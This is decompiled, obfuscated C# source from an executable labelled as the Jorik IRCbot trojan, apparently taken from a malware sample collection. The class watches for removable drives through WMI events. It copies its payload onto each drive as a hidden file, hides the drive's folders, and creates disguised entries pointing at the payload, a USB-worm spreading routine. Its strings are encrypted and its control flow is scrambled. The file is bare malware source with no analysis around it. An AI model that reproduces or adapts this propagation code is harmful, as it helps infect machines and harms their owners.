// Decompiled with JetBrains decompiler
// Type: .
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=24b8f1c2e28acde2
// MVID: 0C7B899D-7035-4B2D-B433-3C80E566FC1C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Jorik.IRCbot.gim-3e8d8a98ac44098acc3d92301b4ae92e5e6e1a5f0b2d861cd9e69e0650edce63.exe

using \u0003;
using \u0004;
using \u000E;
using \u000F;
using System;
using System.IO;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;

namespace \u0006
{
  internal sealed class \u0003
  {
    private static ManagementEventWatcher \u0001;
    public static bool \u0001;
    private static bool \u0002;
    [NonSerialized]
    internal static \u0008.\u0004 \u0092;

    public static void \u0001()
    {
      DriveInfo[] driveInfoArray = \u0011\u0003.\u009B\u0004();
      int index1 = 0;
      while (true)
      {
        int num1 = index1;
        int num2 = driveInfoArray.Length;
        if (false)
          goto label_22;
        else
          goto label_25;
label_21:
        num2 = 1;
        int num3;
        num1 = num3;
label_22:
        num3 = num1 + num2;
        if (true)
        {
          index1 = num3;
          continue;
        }
        goto label_21;
label_25:
        int num4 = num2;
        if (num1 < num4)
        {
          DriveInfo driveInfo = driveInfoArray[index1];
          try
          {
            if (\u0012\u0003.\u007E\u009C\u0004((object) driveInfo) == DriveType.Removable)
            {
              \u0010 obj1 = \u0010.\u008D;
              global::\u0003 obj2 = global::\u0003.\u007E\u000E;
              \u001D obj3 = \u001D.\u007E\u0084\u0002;
              \u0007\u0002 obj4 = \u0007\u0002.\u007E\u008E\u0003;
              \u0082 obj5 = \u0082.\u0091\u0002;
              \u0081 obj6 = \u0081.\u007E\u008F\u0002;
              Encoding encoding = \u0080.\u008A\u0002();
              object[] objArray = new object[4]
              {
                (object) \u0014\u0002.\u007E\u0098\u0003((object) driveInfo),
                (object) global::\u0003.\u007E\u0016((object) driveInfo),
                (object) global::\u0003.\u007E\u0017((object) driveInfo),
                (object) \u0006.\u0003.\u0092(5318)
              };
              string str1 = \u0013\u0003.\u009D\u0004(objArray);
              byte[] numArray = obj6((object) encoding, str1);
              string str2 = obj5(numArray);
              string str3 = \u0006.\u0003.\u0092(5331);
              string str4 = \u0006.\u0003.\u0092(1674);
              string str5 = obj4((object) str2, str3, str4);
              string str6 = obj3((object) str5, 0, 7);
              string str7 = obj2((object) str6);
              string str8 = \u0006.\u0003.\u0092(2049);
              string str9 = obj1(str7, str8);
              string str10 = \u0010.\u008D(global::\u0003.\u007E\u0018((object) driveInfo), str9);
              if (\u0011\u0002.\u0094\u0003(str10))
              {
                if (\u0007.\u0087(\u0001.\u0004, \u0002.\u0002(str10)))
                {
                  \u0014\u0003.\u009E\u0004(\u0001.\u0001, str10, true);
                  \u001A.\u0081\u0002(str10, FileAttributes.Hidden);
                }
                else
                  goto label_18;
              }
              else
                goto label_6;
label_5:
              string[] strArray1 = new string[5]
              {
                \u0006.\u0003.\u0092(5336),
                \u0002.\u0001(\u0010.\u008D(\u0006.\u0003.\u0092(663), global::\u0003.\u007E\u0018((object) driveInfo))),
                \u0006.\u0003.\u0092(5389),
                \u0002.\u0001(\u0010.\u008D(\u0006.\u0003.\u0092(663), \u0001.\u0004)),
                \u0006.\u0003.\u0092(577)
              };
              \u0002.\u0001(\u0018.\u001A\u0002(strArray1), \u0001.\u0010);
              goto label_18;
label_6:
              \u0014\u0003.\u009E\u0004(\u0001.\u0001, str10, true);
              \u001A.\u0081\u0002(str10, FileAttributes.Hidden);
              DirectoryInfo[] directoryInfoArray1 = \u0015\u0003.\u009F\u0004((object) new DirectoryInfo(global::\u0003.\u007E\u0018((object) driveInfo)), \u0006.\u0003.\u0092(5418), SearchOption.TopDirectoryOnly);
              int num5 = 0;
              string[] strArray2;
              if (true)
              {
                DirectoryInfo[] directoryInfoArray2 = directoryInfoArray1;
                int index2 = 0;
                while (true)
                {
                  int num6 = index2;
                  int num7 = directoryInfoArray2.Length;
                  if (true)
                    goto label_12;
label_9:
                  num5 = num6 + num7;
                  ++index2;
                  continue;
label_12:
                  if (num6 < num7)
                  {
                    DirectoryInfo directoryInfo = directoryInfoArray2[index2];
                    \u0016\u0003.\u007E\u0001\u0005((object) directoryInfo, FileAttributes.Hidden);
                    \u0006.\u0003.\u0001(global::\u0003.\u007E\u0005((object) \u0017\u0003.\u007E\u0002\u0005((object) driveInfo)), \u0010.\u008D(global::\u0003.\u007E\u0019((object) directoryInfo), \u0006.\u0003.\u0092(5423)), str9, \u0010.\u008D(\u0006.\u0003.\u0092(5432), global::\u0003.\u007E\u001A((object) directoryInfo)), global::\u0003.\u007E\u0019((object) directoryInfo));
                    int num8 = num5;
                    num7 = 1;
                    num6 = num8;
                    goto label_9;
                  }
                  else if (num5 > 0)
                  {
                    strArray2 = new string[5]
                    {
                      \u0006.\u0003.\u0092(5453),
                      \u0002.\u0001(\u0010.\u008D(\u0006.\u0003.\u0092(663), global::\u0003.\u007E\u0018((object) driveInfo))),
                      null,
                      null,
                      null
                    };
                    goto label_15;
                  }
                  else
                    goto label_18;
                }
                goto label_5;
              }
label_15:
              strArray2[2] = \u0006.\u0003.\u0092(5494);
              strArray2[3] = \u0002.\u0001(\u0010.\u008D(\u0006.\u0003.\u0092(663), num5.ToString()));
              strArray2[4] = \u0006.\u0003.\u0092(5503);
              \u0002.\u0001(\u0018.\u001A\u0002(strArray2), \u0001.\u0010);
            }
          }
          catch
          {
          }
label_18:
          if (!\u0006.\u0003.\u0002)
            \u0006.\u0003.\u0002();
          num3 = index1;
          goto label_21;
        }
        else
          break;
      }
    }

    private static void \u0001([In] string obj0, [In] string obj1, [In] string obj2, [In] string obj3, [In] string obj4)
    {
      \u0002 obj = new \u0002();
      try
      {
        do
        {
          obj.\u0002(\u0010.\u008D(\u001B\u0002.\u0003\u0004(), \u0006.\u0003.\u0092(2628)));
          if (false)
            goto label_4;
          else
            goto label_11;
label_2:
          if (true)
            obj.\u0003(\u0006.\u0003.\u0092(5526));
label_4:
          obj.\u0004(obj4);
          while (true)
          {
            obj.\u0001(\u0010.\u008D(\u001B\u0002.\u0003\u0004(), \u0006.\u0003.\u0092(5535)));
            if (true)
            {
              if (true)
              {
                obj.\u0001(3);
                break;
              }
            }
            else
              goto label_2;
          }
          obj.\u0001(\u0002.\u000E.\u0002);
          obj.\u0006(\u0011.\u008E(obj0, \u0006.\u0003.\u0092(2044), obj1));
          continue;
label_11:
          obj.\u0005(\u0005\u0002.\u008C\u0003(\u0006.\u0003.\u0092(5516), obj2, \u0006.\u0003.\u0092(5521), obj3));
          goto label_2;
        }
        while (false);
      }
      finally
      {
        if (obj != null)
          \u0013.\u007E\u009D((object) obj);
      }
    }

    public static void \u0002()
    {
      ManagementScope scope = new ManagementScope(\u0006.\u0003.\u0092(5552));
      do
      {
        \u0084 obj = \u0084.\u007E\u009C\u0002;
        ConnectionOptions connectionOptions = \u0018\u0003.\u007E\u0003\u0005((object) scope);
        if (true)
          goto label_9;
label_2:
        try
        {
          WqlEventQuery query = new WqlEventQuery();
          \u0012.\u007E\u0099((object) query, \u0006.\u0003.\u0092(5569));
          \u0019\u0003.\u007E\u0004\u0005((object) query, new TimeSpan(0, 0, 3));
          \u0012.\u007E\u009A((object) query, \u0006.\u0003.\u0092(5602));
          \u0006.\u0003.\u0001 = new ManagementEventWatcher(scope, (EventQuery) query);
          \u001A\u0003.\u007E\u0005\u0005((object) \u0006.\u0003.\u0001, new EventArrivedEventHandler(\u0006.\u0003.\u0001));
          \u0013.\u007E\u0013\u0002((object) \u0006.\u0003.\u0001);
          \u0006.\u0003.\u0002 = true;
        }
        catch
        {
          do
          {
            if (\u0006.\u0003.\u0001 != null)
              \u0013.\u007E\u0014\u0002((object) \u0006.\u0003.\u0001);
          }
          while (false);
        }
        continue;
label_9:
        obj((object) connectionOptions, true);
        goto label_2;
      }
      while (false);
    }

    private static void \u0001([In] object obj0, [In] EventArgs obj1) => \u0006.\u0003.\u0001();

    static \u0003()
    {
      bool flag;
      if (true)
      {
        \u0005.\u0001(typeof (\u0006.\u0003));
        flag = false;
      }
      else
        goto label_4;
label_2:
      Assembly assembly = \u007F.\u0089\u0002();
      if (\u0006.\u0003.\u0001(global::\u0003.\u007E\u0006((object) assembly), true, out flag))
        goto label_11;
label_5:
      throw new SecurityException(\u0006.\u0003.\u0092(776));
label_11:
      int num = flag ? 1 : 0;
      if (true)
      {
        if (num == 0 || !\u0005.\u007E\u0082((object) global::\u0003.\u007E\u0007((object) assembly), \u0006.\u0003.\u0092(751)))
          goto label_5;
      }
      else
        goto label_10;
label_4:
      do
      {
        if (true)
          \u0006.\u0003.\u0001 = false;
      }
      while (false);
      if (true)
        num = 0;
      else
        goto label_2;
label_10:
      \u0006.\u0003.\u0002 = num != 0;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);
  }
}
